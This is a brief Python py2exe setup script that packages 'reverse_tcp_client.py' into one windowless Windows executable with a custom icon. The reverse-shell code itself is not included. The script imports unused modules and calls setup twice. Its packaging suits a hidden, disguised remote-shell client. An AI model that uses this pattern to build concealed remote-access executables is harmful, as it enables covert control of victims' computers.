from distutils.core import setup
import py2exe, sys, socket, subprocess

sys.argv.append("py2exe")
setup_dict = dict(
    options = {"py2exe": {"bundle_files": 1 }},
    zipfile = None,
    windows = [{"script" : "reverse_tcp_client.py",
                "icon_resources": [(1, "h.ico")]
    }],
)

setup(**setup_dict)
setup(**setup_dict)
